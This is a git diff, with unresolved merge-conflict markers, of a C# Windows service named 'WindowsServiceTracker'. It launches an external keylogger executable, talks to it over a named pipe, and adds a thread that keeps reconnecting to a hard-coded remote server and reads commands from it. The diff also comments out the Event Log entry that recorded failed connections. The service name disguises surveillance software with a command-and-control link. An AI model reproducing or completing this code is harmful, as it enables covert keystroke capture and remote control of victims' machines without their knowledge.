@@ -32,14 +32,19 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
         private const string EXTERNAL_PROCESS = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";
 
-        private Process keyLogger = null;
+        //private Process keyLogger = null;
         private ProcessStartInfo keyLoggerStartInfo;
         private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
-        private TcpClient tcp;
+        private volatile TcpClient tcp;
         private NetworkStream tcpStream;
+<<<<<<< HEAD
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeReverse"));
         private KeyloggerCommInterface pipeProxy;
+=======
+        private Thread tcpThread;
+        private volatile bool tcpKeepAlive = true;
+>>>>>>> cffb9bff092879836386fd87155b3d2350271a46
 
         //private Keylogger keylog = new Keylogger();
 
@@ -67,17 +72,26 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
+<<<<<<< HEAD
 
+=======
+            //StartKeyLogger();
+>>>>>>> cffb9bff092879836386fd87155b3d2350271a46
         }
 
         protected override void OnStop()
         {
             //Keylogger.Stop();
-            SendStringMsg("Bye!");
+            //SendStringMsg("Bye!");
 
             //StopKeyLogger();
 
             Disconnect();
+            tcpKeepAlive = false;
+            if (tcpThread != null && tcpThread.IsAlive)
+            {
+                tcpThread.Join();
+            }
         }
 
         private void CreateOpenPipe()
@@ -103,7 +117,53 @@ namespace WindowsServiceTracker
             EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
         }
 
+<<<<<<< HEAD
         /*private bool StartKeyLogger() //todo exception handling
+=======
+        //make a thread based on this method to connect to the server and read/write to the tcp connection
+        private void MaintainServerConnection()
+        {
+            int waitToRetry = 0;
+            int bufferSize = 256;
+            byte[] buffer = new byte[bufferSize];
+            while (tcpKeepAlive)
+            {
+                if (tcp == null || !tcp.Connected)
+                {
+                    try 
+                    {
+                        Connect();
+                        waitToRetry = 0;
+                    }
+                    catch (Exception)
+                    {
+                        Thread.Sleep(waitToRetry * 1000);
+                        if (waitToRetry < 60)
+                        {
+                            waitToRetry += 5;
+                        }
+                    }
+                }
+                else
+                {
+                    // todo make sure thCanRead is false in the case that a previous connection was lost, 
+                    // and new one created, but the stream was not changed from the old connection
+                    if (tcpStream != null && tcpStream.CanRead)
+                    {
+                        tcpStream.Read(buffer, 0, bufferSize);
+                        //act on buffer contents
+                    }
+                    else
+                    {
+                        getTcpStream();
+                    }
+                }
+            }
+        }
+
+        /*
+        private bool StartKeyLogger() //todo exception handling
+>>>>>>> cffb9bff092879836386fd87155b3d2350271a46
         {
             if (keyLogger != null && keyLogger.Responding)
             {
@@ -132,7 +192,12 @@ namespace WindowsServiceTracker
                 keyLogger.Kill(); //todo explore better/safer options
             }
             return true;
+<<<<<<< HEAD
         }*/
+=======
+        }
+        */
+>>>>>>> cffb9bff092879836386fd87155b3d2350271a46
 
         private bool Connect()
         {
@@ -145,10 +210,11 @@ namespace WindowsServiceTracker
             catch (Exception)
             {
                 //Another write to the Windows Event Logs, shows up in the same place as before but as type "Error" instead of type "Information"
-                string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
-                EventLog.WriteEntry(ERROR_LOG_SOURCE, error, EventLogEntryType.Error);
+                //string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
+                //EventLog.WriteEntry(ERROR_LOG_SOURCE, error, EventLogEntryType.Error);
+                throw new Exception("Error connecting");
             }
-            return false;
+            //return false;
         }
 
         private bool Disconnect()
@@ -159,6 +225,19 @@ namespace WindowsServiceTracker
             }
             catch (NullReferenceException)
             { }
+            return true;
+        }
+
+        private bool getTcpStream()
+        {
+            try
+            {
+                tcpStream = tcp.GetStream();
+            }
+            catch (InvalidOperationException)
+            {
+                return false;
+            }
             return true;
         }
 
